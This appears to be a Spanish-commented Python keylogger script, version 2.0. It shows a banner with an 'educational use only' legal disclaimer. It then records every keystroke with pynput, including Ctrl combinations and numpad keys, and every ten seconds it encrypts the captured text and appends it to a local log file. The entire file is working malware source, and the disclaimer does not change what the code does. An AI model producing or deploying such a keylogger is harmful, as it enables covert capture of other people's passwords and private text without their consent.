from pynput import keyboard
import signal
import sys , os
import threading
from key import fern

class Colores:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m' 
    FAIL = '\033[91m'    
    ENDC = '\033[0m'     
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def mostrar_banner():
    os.system('cls' if os.name == 'nt' else 'clear')

    ascii_art = f"""
{Colores.CYAN}    __            __
{Colores.CYAN}   / /_____ __ __/ /
{Colores.BLUE}  /  '_/ -_) // / / 
{Colores.BLUE} /_/\\_\\\\__/\_, /_/  
{Colores.BLUE}          /___/     {Colores.ENDC}{Colores.BOLD}v2.0 | Encrypted & Multithreaded{Colores.ENDC}
"""

    disclaimer = f"""
{Colores.BOLD}╔══════════════════════════════════════════════════════════════════════╗{Colores.ENDC}
{Colores.BOLD}║{Colores.WARNING}                  >>> USO EXCLUSIVO EDUCATIVO <<<                     {Colores.BOLD}║{Colores.ENDC}
{Colores.BOLD}╠══════════════════════════════════════════════════════════════════════╣{Colores.ENDC}
{Colores.BOLD}║{Colores.FAIL} ADVERTENCIA LEGAL:                                                   {Colores.BOLD}║{Colores.ENDC}
{Colores.BOLD}║{Colores.FAIL} Esta herramienta ha sido desarrollada únicamente con fines de        {Colores.BOLD}║{Colores.ENDC}
{Colores.BOLD}║{Colores.FAIL} aprendizaje y prueba de conceptos de ciberseguridad.                 {Colores.BOLD}║{Colores.ENDC}
{Colores.BOLD}║                                                                      ║{Colores.ENDC}
{Colores.BOLD}║{Colores.FAIL} El autor NO se hace responsable del mal uso, daño a terceros o       {Colores.BOLD}║{Colores.ENDC}
{Colores.BOLD}║{Colores.FAIL} actividades ilegales derivadas de la ejecución de este software.     {Colores.BOLD}║{Colores.ENDC}
{Colores.BOLD}║{Colores.FAIL} Úsalo bajo tu propia responsabilidad y solo en entornos controlados. {Colores.BOLD}║{Colores.ENDC}
{Colores.BOLD}╚══════════════════════════════════════════════════════════════════════╝{Colores.ENDC}
"""

    print(ascii_art)
    print(disclaimer)
    print(f"\n{Colores.GREEN}[*] Iniciando sistema...{Colores.ENDC}\n")

#Lista Global para introducir el texto y formatearlo apropiadamente
texto = []
#Boolean Global para controlar el uso de teclas especiales asociadas al boton CTRL
ctrl_pressed = False
traffic_light = threading.Lock()
INTERVAL = 10

def def_handler(sig,frame):
    """Maneja la salida limpia con CTRL+C"""
    print("\n\nSaliendo\n\n")
    report()
    sys.exit(0)

signal.signal(signal.SIGINT,def_handler)

def report():
    """Funcion en segundo plano cada X segundos"""
    global texto
    with traffic_light:
        write_file()
        texto.clear()
    
    timer = threading.Timer(INTERVAL,report)
    timer.daemon = True
    timer.start()

def write_file():
    """Cifra el contenido del buffer y lo guarda con un separador"""
    global texto
    
    if texto:
        cadena_limpia = "".join(texto)
        
        #Convertir String a Bytes
        datos_en_bytes = cadena_limpia.encode('utf-8')
        
        #Cifrar
        datos_cifrados = fern.encrypt(datos_en_bytes)
        
        with open("log_seguro.txt", "ab") as file:
            file.write(datos_cifrados + b"\n")

def on_press(key):
    global ctrl_pressed
    
    with traffic_light:
        try:
            if hasattr(key, 'char') and key.char is not None:
                if not ctrl_pressed:
                    texto.append(key.char)
                else:
                    texto.append(f"[CTRL+{str(key)}]")
            else:
                key_str = str(key)
                # Mapeo de códigos de Numpad (96=0, 97=1, etc.)
                numpad_map = {
                    '<96>': '0', '<97>': '1', '<98>': '2', '<99>': '3', 
                    '<100>': '4', '<101>': '5', '<102>': '6', '<103>': '7', 
                    '<104>': '8', '<105>': '9', '<110>': '.'
                }
                
                for code, val in numpad_map.items():
                    if code in key_str:
                        texto.append(val)

        except AttributeError:
            pass

        #Manejo de Teclas Especiales (Backspace, Enter, Space)
        key_str = str(key)
        if key_str == "Key.space":
            texto.append(" ")
        elif key_str == "Key.enter":
            texto.append("\n")
        elif key_str == "Key.backspace":
            if texto: texto.pop()
        elif key_str in ["Key.ctrl_l", "Key.ctrl_r"]:
            ctrl_pressed = True

def on_release(key):
    global ctrl_pressed
    if str(key) in ["Key.ctrl_l", "Key.ctrl_r"]:
        ctrl_pressed = False

if __name__ == "__main__":
    mostrar_banner()
    report()

    # Iniciamos el escuchador de teclado
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    try:
        input("Presiona Enter para continuar (o Ctrl+C para salir)...")
    except KeyboardInterrupt:
        print(f"\n{Colores.FAIL}[!] Programa terminado por el usuario.{Colores.ENDC}")
